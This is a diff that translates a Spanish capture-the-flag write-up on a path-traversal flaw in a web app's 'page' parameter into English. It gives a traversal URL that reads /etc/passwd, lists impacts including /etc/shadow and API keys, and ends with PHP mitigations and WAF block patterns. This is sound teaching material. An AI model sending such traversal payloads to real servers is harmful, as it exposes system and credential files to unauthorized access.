@@ -1,54 +1,54 @@
 # A5 - Path Traversal (Directory Traversal)
 
-Vulnerabilidad del OWASP Top 10 (2017), clasificada dentro de A5: Broken Access Control. El parámetro `page` de la URL carga archivos directamente en el servidor sin validar la ruta, permitiendo escapar del directorio previsto con secuencias `../`.
+OWASP Top 10 (2017) vulnerability, classified under A5: Broken Access Control. The `page` URL parameter loads files directly from the server without validating the path, allowing escape from the intended directory with `../` sequences.
 
 ---
 
-## Pasos para obtener la flag
+## Steps to Obtain the Flag
 
-### 1. Identificar el vector
+### 1. Identify the Vector
 
-El parámetro `page` carga recursos del servidor:
+The `page` parameter loads resources from the server:
 ```
-http://<IP>/?page=<ruta>
+http://<IP>/?page=<path>
 ```
 
-### 2. Explotar
+### 2. Exploit
 
-Usar `../` repetidas veces para llegar a la raíz del sistema y acceder a archivos sensibles:
+Use repeated `../` to reach the system root and access sensitive files:
 ```
 http://<IP>/?page=../../../../../../../etc/passwd
 ```
 
-Cada `../` sube un nivel en la jerarquía de directorios:
+Each `../` moves up one level in the directory hierarchy:
 ```
 /var/www/html/ → /var/www/ → /var/ → / → /etc/passwd
 ```
 
-El servidor carga el archivo solicitado sin validar la ruta y devuelve la **flag**.
+The server loads the requested file without validating the path and returns the **flag**.
 
 ---
 
-## Impacto
+## Impact
 
-- **Divulgación de información:** lectura de `/etc/passwd`, `/etc/shadow`, archivos de configuración, claves API.
-- **Bypass de control de acceso:** eludir restricciones sobre qué archivos puede acceder el usuario.
-- **Reconocimiento del sistema:** mapeo de la estructura de directorios.
-- **Escalada de privilegios:** información útil para preparar ataques posteriores.
+- **Information Disclosure:** reading `/etc/passwd`, `/etc/shadow`, configuration files, API keys.
+- **Access Control Bypass:** evade restrictions on which files the user can access.
+- **System Reconnaissance:** mapping directory structure.
+- **Privilege Escalation:** useful information to prepare subsequent attacks.
 
 ---
 
-## Mitigación
+## Mitigation
 
-1. **Validar y sanitizar rutas en servidor:**
+1. **Validate and Sanitize Paths on Server:**
    ```php
    $page = basename($_GET['page']);
    $safe_path = realpath('./pages/' . $page . '.php');
-   if (strpos($safe_path, realpath('./pages/')) !== 0) die('Acceso denegado');
+   if (strpos($safe_path, realpath('./pages/')) !== 0) die('Access denied');
    include($safe_path);
    ```
-2. **Whitelist de páginas permitidas:** solo aceptar identificadores conocidos, nunca rutas libres.
-3. **Bloquear caracteres peligrosos:** rechazar `..`, `/` y `\` en el parámetro.
-4. **Configurar `open_basedir` en PHP** para limitar el acceso a un directorio específico.
-5. **Permisos restrictivos en el filesystem:** archivos sensibles fuera del webroot y sin lectura por el proceso web.
-6. **WAF:** reglas para bloquear `../`, `%2e%2e` y accesos a rutas como `/etc/passwd`.
+2. **Whitelist of Allowed Pages:** accept only known identifiers, never free paths.
+3. **Block Dangerous Characters:** reject `..`, `/`, and `\` in the parameter.
+4. **Configure `open_basedir` in PHP** to limit access to a specific directory.
+5. **Restrictive Filesystem Permissions:** sensitive files outside webroot and unreadable by web process.
+6. **WAF:** rules to block `../`, `%2e%2e`, and access to paths like `/etc/passwd`.
